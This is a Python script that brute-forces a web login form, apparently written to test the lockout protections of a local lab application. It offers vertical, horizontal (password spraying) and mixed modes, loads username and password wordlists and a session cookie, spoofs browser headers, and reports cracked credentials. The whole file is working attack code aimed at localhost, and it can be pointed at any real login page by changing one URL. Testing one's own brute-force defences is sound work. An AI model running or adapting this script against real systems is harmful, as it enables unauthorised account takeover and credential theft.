import requests
from bs4 import BeautifulSoup
import time

# URL for login
LOGIN_URL = 'http://localhost/blockbruteforce/login.php'

# Load username and password lists
try:
    with open('usernames.txt', 'r') as file:
        usernames = [line.strip() for line in file.readlines()]

    with open('passwords.txt', 'r') as file:
        passwords = [line.strip() for line in file.readlines()]
except FileNotFoundError as e:
    print(f"Error: {e}")
    exit(1)

def load_cookie():
    """Load session cookie from file."""
    try:
        with open('browser_cookie.txt', 'r') as file:
            cookie_line = file.read().strip()
            key, value = cookie_line.split('=', 1)
            return {key: value}
    except Exception as e:
        print(f"Error loading cookie: {e}")
        exit(1)

def attempt_login(session, username, password):
    """Attempt to login with given username and password."""
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
        'Referer': LOGIN_URL  # Referer header to mimic browser behavior
    }

    login_data = {
        'username': username,
        'password': password
    }

    # Perform the login request
    response = session.post(LOGIN_URL, data=login_data, headers=headers, allow_redirects=False)

    # Check if the account is locked or too many attempts
    if response.status_code == 403:
        if "Account temporarily locked" in response.text:
            print(f"[BLOCKED] Account locked for username: {username}.")
            return False, response
        elif "too many attempts" in response.text:
            print(f"[BLOCKED] Brute-force prevention triggered for username: {username}.")
            return False, response

    # Check for successful login (by checking for the redirect to dashboard)
    if response.status_code == 302 and "Location" in response.headers and response.headers["Location"] == "dashboard.php":
        print(f"[SUCCESS] Login successful for Username: {username}, Password: {password}")
        return True, response

    # If the credentials are invalid
    if "Invalid credentials" in response.text:
        print(f"[FAIL] Invalid credentials for {username}. Password: {password}")
        return False, response

    print(f"[INFO] Response: {response.status_code}, {response.text}")
    return False, response

# Define color codes
GREEN = "\033[32m"
RED = "\033[31m"
RESET = "\033[0m"

def vertical_brute_force(single_username, sleep_time):
    """Perform vertical brute-force attack for a single user."""
    failed_attempts = 0

    with requests.Session() as session:
        session.cookies.update(load_cookie())  # Load cookie into session

        for password in passwords:
            success, response = attempt_login(session, single_username, password)

            if success:
                print(f"{GREEN}[SUCCESS]{RESET} Username: {single_username}, Password: {password}")
                return
            elif "Invalid credentials" in response.text:
                print(f"[FAIL] Password: {password}")
                failed_attempts += 1
            else:
                print(f"[INFO] Password: {password}, Response: {response.status_code}")

            # Stop if brute-force protection activates
            if response.status_code == 403 or "too many attempts" in response.text.lower():
                print(f"{RED}[BLOCKED]{RESET} Brute-force prevention detected after {failed_attempts} attempts.")
                break

            time.sleep(sleep_time)

def horizontal_attack(sleep_time):
    """Perform horizontal brute-force attack (one password across all users)."""
    failed_attempts = 0

    with requests.Session() as session:
        session.cookies.update(load_cookie())

        for password in passwords:
            print(f"Attempting Password: {password} across all users")

            for username in usernames:
                success, response = attempt_login(session, username, password)

                if success:
                    print(f"{GREEN}[SUCCESS]{RESET} Username: {username}, Password: {password}")
                    return
                elif "Invalid credentials" in response.text:
                    print(f"[FAIL] Username: {username}, Password: {password}")
                    failed_attempts += 1
                else:
                    print(f"[INFO] Response: {response.status_code}")

                if response.status_code == 403 or "too many attempts" in response.text.lower():
                    print(f"{RED}[BLOCKED]{RESET} Brute-force prevention detected after {failed_attempts} attempts.")
                    return

                time.sleep(sleep_time)

def mixed_attack(sleep_time):
    """Perform mixed brute-force attack."""
    with requests.Session() as session:
        session.cookies.update(load_cookie())

        for username in usernames:
            print(f"Testing passwords for Username: {username}")
            failed_attempts = 0

            for password in passwords:
                success, response = attempt_login(session, username, password)

                if success:
                    print(f"{GREEN}[SUCCESS]{RESET} Username: {username}, Password: {password}")
                    return
                elif "Invalid credentials" in response.text:
                    print(f"[FAIL] Username: {username}, Password: {password}")
                    failed_attempts += 1
                else:
                    print(f"[INFO] Response: {response.status_code}")

                if response.status_code == 403 or "too many attempts" in response.text.lower():
                    print(f"{RED}[BLOCKED]{RESET} Brute-force prevention triggered after {failed_attempts} attempts.")
                    break

                time.sleep(sleep_time)

# Choose attack type
try:
    sleep_time = float(input("Enter sleep time between requests (in seconds, e.g., 1.5): "))
except ValueError:
    print("Invalid input. Using default sleep time of 1 second.")
    sleep_time = 1.0

print("Select attack type: \n1. Vertical (multiple passwords, single user)\n2. Horizontal (single password, multiple users)\n3. Mixed (multiple passwords, all users)")
choice = input("Enter choice (1, 2, or 3): ")

if choice == "1":
    target_username = input("Enter the username for vertical brute-force: ")
    vertical_brute_force(target_username, sleep_time)
elif choice == "2":
    horizontal_attack(sleep_time)
elif choice == "3":
    mixed_attack(sleep_time)
else:
    print("Invalid choice.")
